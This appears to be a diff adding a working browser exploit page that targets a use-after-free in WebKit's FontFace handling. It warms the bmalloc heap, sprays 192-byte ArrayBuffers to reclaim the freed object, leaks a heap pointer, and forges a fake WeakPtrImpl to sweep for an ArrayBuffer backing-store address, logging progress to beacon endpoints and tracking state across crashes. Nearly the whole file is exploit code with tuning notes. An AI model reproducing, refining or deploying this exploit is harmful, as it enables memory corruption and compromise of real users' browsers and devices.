@@ -1,0 +1,237 @@
+<!--
+  p578 v5: Lane_VA sweep — find ArrayBuffer backing store address.
+
+  Pre-churn + two-FontFace two-UAF approach per page load:
+  Phase 0: dummy FontFace lifecycle to warm the 192B bmalloc bucket
+  Phase 1: leak p58 from FontFace A (clean spray, read engine-written data)
+  Phase 2: forge FontFace B with self-referential wrapper at +0x68
+
+  Discrimination: +0x68 = (p58 + delta) + 0x70, pointing INTO
+  our buffer at a fake WeakPtrImpl (refcount=2, m_ptr=NULL).
+  Correct delta → engine follows +0x68 → our WeakPtrImpl → m_ptr=NULL → skip → SURVIVED.
+  Wrong delta → +0x68 points to random memory → crash.
+
+  v5 fix: 192B-ONLY spray, K=16. ng643 measured that the 13-size spray
+  (104 buffers) OOMs the WebProcess before the scan fires. Only the
+  192B-only spray survives. CSSFontFace is exactly 192B so other sizes
+  are wasted memory.
+
+  ng643 empirical (14.10):
+    +0x68 = 0 → survived 8/14 (57%) — NULL wrapper safe (V15)
+    +0x68 = 1 → survived 0/12 — engine dereferences it (pointer)
+    +0x58 = 1 → survived 0/4 — also dereferenced
+
+  WeakPtrImpl layout (no vtable, RefCounted CRTP):
+    +0x00: m_refCount (u32) = 2
+    +0x04: padding = 0
+    +0x08: m_ptr (void*) = 0 (NULL → skip)
+
+  Spiral sweep at 0x40 stride, ±32KB around p58.
+  localStorage tracks progress across crashes.
+  Open #reset to clear state.
+
+  CRASH_CLASS: HIGH (one crash per wrong delta)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p578 sweep</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+function readQ(v,o){
+  var lo=(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);
+  var hi=(v[o+4]|0)+((v[o+5]|0)<<8)+((v[o+6]|0)<<16)+((v[o+7]|0)*0x1000000);
+  return [hi,lo];
+}
+function writeQ(v,o,hi,lo){
+  v[o]=lo&0xFF;v[o+1]=(lo>>>8)&0xFF;v[o+2]=(lo>>>16)&0xFF;v[o+3]=(lo>>>24)&0xFF;
+  v[o+4]=hi&0xFF;v[o+5]=(hi>>>8)&0xFF;v[o+6]=(hi>>>16)&0xFF;v[o+7]=(hi>>>24)&0xFF;
+}
+function writeD(v,o,val){v[o]=val&0xFF;v[o+1]=(val>>>8)&0xFF;v[o+2]=(val>>>16)&0xFF;v[o+3]=(val>>>24)&0xFF;}
+function addQ(hi,lo,d){var nl=lo+d,nh=hi;while(nl<0){nh--;nl+=0x100000000;}while(nl>=0x100000000){nh++;nl-=0x100000000;}return[nh,nl];}
+function hexQ(hi,lo){return('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);}
+function hexD(d){return(d>=0?'+':'-')+'0x'+Math.abs(d).toString(16);}
+
+var STRIDE=0x40,RANGE=0x8000;
+var DELTAS=[0];
+for(var d=STRIDE;d<=RANGE;d+=STRIDE){DELTAS.push(d);DELTAS.push(-d);}
+
+var K=16,SIZE=192;
+var retained=[];
+
+function gs(){try{var s=localStorage.getItem('p578');return s?JSON.parse(s):null;}catch(e){return null;}}
+function ss(s){try{localStorage.setItem('p578',JSON.stringify(s));}catch(e){}}
+
+/* ---- Pre-churn: warm the 192B bmalloc bucket ---- */
+function prechurn(cb){
+  b('P578-PC');
+  var dummy;
+  try{dummy=new FontFace('pchurn','local(Arial)',{unicodeRange:'U+0045'});}catch(e){b('P578-PC-ERR');cb();return;}
+  try{document.fonts.add(dummy);}catch(e){}
+  dummy.load();
+  b('P578-PC-LOAD');
+  dummy.loaded.then(function(){
+    try{document.fonts.delete(dummy);}catch(e){}
+    document.body.offsetHeight;
+    b('P578-PC-DEL');
+    cb();
+  },function(){
+    b('P578-PC-FAIL');
+    cb();
+  });
+}
+
+/* ---- Leak phase: get p58 from FontFace A ---- */
+function leakPhase(cb){
+  b('P578-LK');
+  var A;
+  try{A=new FontFace('flk','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('P578-LK-ERR');cb(null);return;}
+  try{document.fonts.add(A);}catch(e){}
+  try{void A.loaded;}catch(e){}
+  retained.push(A);
+
+  var se=document.createElement('style');
+  se.textContent="@font-face{font-family:slk;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(se);
+
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    if(se)se.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P578-LK-FREE');
+
+    window.__lk=[];
+    for(var k=0;k<K;k++)
+      window.__lk.push({s:SIZE,v:new Uint8Array(new ArrayBuffer(SIZE))});
+    b('P578-LK-SPR');
+    try{document.fonts.check('1em slk');}catch(e){}
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em flk, slk','AB').then(function(){b('P578-LK-OK');},function(){b('P578-LK-FAIL');});
+  b('P578-LK-GO');
+
+  var lkdone=false;
+  function lkscan(){
+    if(lkdone)return;
+    var m=window.__lk;if(!m)return;
+    for(var i=0;i<m.length;i++){
+      var v=m[i].v,nz=0;
+      for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+      if(nz>0){
+        var r=readQ(v,0x58);
+        if(r[0]>=0x10){lkdone=true;b('P578-LK-HIT-p58='+hexQ(r[0],r[1]));cb(r);return;}
+      }
+    }
+  }
+  setTimeout(lkscan,80);
+  setTimeout(lkscan,400);
+  setTimeout(lkscan,1000);
+  setTimeout(function(){if(!lkdone){lkdone=true;b('P578-NOLEAK');cb(null);}},3000);
+}
+
+/* ---- Forge phase: test one delta ---- */
+function forgePhase(p58,delta,onSurvived){
+  var cand=addQ(p58[0],p58[1],delta);
+  var wpi=addQ(cand[0],cand[1],0x70);
+
+  var B;
+  try{B=new FontFace('fft','local(Helvetica)',{unicodeRange:'U+0043'});}catch(e){b('P578-FG-ERR');return;}
+  try{document.fonts.add(B);}catch(e){}
+  try{void B.loaded;}catch(e){}
+  retained.push(B);
+
+  var se2=document.createElement('style');
+  se2.textContent="@font-face{font-family:slk2;src:local(Arial);unicode-range:U+0044;}";
+  document.head.appendChild(se2);
+
+  var fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired2)return undefined;fired2=true;
+    if(se2)se2.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P578-FG-FREE');
+
+    window.__fg=[];
+    for(var k=0;k<K;k++){
+      var ab=new ArrayBuffer(SIZE);
+      var v=new Uint8Array(ab);
+      writeD(v,0x00,2);
+      writeQ(v,0x68,wpi[0],wpi[1]);
+      writeD(v,0x70,2);
+      writeD(v,0x74,0);
+      writeQ(v,0x78,0,0);
+      window.__fg.push({s:SIZE,v:v});
+    }
+    b('P578-FG-SPR');
+    try{document.fonts.check('1em slk2');}catch(e){}
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em fft, slk2','CD').then(function(){},function(){});
+  b('P578-FG-GO');
+
+  var ok=false;
+  setTimeout(function(){if(!ok){ok=true;onSurvived();}},1200);
+}
+
+/* ---- Main ---- */
+function main(){
+  if(location.hash==='#reset'){
+    try{localStorage.removeItem('p578');}catch(e){}
+    b('P578-RESET');
+    document.body.innerHTML='<p>Cleared. Remove #reset.</p>';
+    return;
+  }
+
+  var state=gs();
+  if(!state)state={idx:0,run:-1,hits:[],boots:0};
+  state.boots++;
+
+  if(state.run>=0){
+    state.idx=state.run+1;
+    state.run=-1;
+  }
+  ss(state);
+
+  if(state.idx>=DELTAS.length){
+    var msg='DONE-'+state.boots+'b-'+state.hits.length+'h';
+    if(state.hits.length>0)msg+='-first='+hexD(state.hits[0]);
+    b('P578-'+msg);
+    document.body.innerHTML='<p>'+msg+'</p>';
+    return;
+  }
+
+  if(state.idx%25===0)b('P578-PROG-'+state.idx+'/'+DELTAS.length+'-'+state.hits.length+'h');
+  b('P578-B'+state.boots+'-I'+state.idx+'-d='+hexD(DELTAS[state.idx]));
+
+  prechurn(function(){
+    leakPhase(function(p58){
+      if(!p58){
+        state.idx++;state.run=-1;ss(state);
+        setTimeout(function(){location.reload();},1000);
+        return;
+      }
+      b('P578-P58='+hexQ(p58[0],p58[1]));
+
+      var delta=DELTAS[state.idx];
+      state.run=state.idx;
+      ss(state);
+
+      forgePhase(p58,delta,function(){
+        var cand=addQ(p58[0],p58[1],delta);
+        b('P578-HIT-d='+hexD(delta)+'-lane='+hexQ(cand[0],cand[1]));
+        state.run=-1;
+        state.hits.push(delta);
+        state.idx++;
+        ss(state);
+        setTimeout(function(){location.reload();},1000);
+      });
+    });
+  });
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(main,0);
+else document.addEventListener('DOMContentLoaded',main);
+</script></head><body><p>p578 v5 — Lane_VA sweep (pre-churn + 192B-only spray + wrapper discriminator)</p></body></html>
